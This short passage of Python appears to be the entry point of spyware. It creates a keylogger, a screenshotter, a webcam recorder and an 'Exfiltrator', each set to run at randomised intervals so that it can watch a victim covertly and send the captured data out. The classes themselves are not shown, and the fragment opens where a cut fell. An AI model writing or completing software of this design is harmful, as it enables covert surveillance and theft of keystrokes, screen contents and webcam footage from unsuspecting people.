...
if __name__ == "__main__":
    keylogger = Keylogger(interval=[10,30])
    screenshotter = Screenshotter(interval=[15,60])
    exfiltrator = Exfiltrator(interval=[30,240])
    webcam = Webcam(interval=[120,300],duration=[20,90])
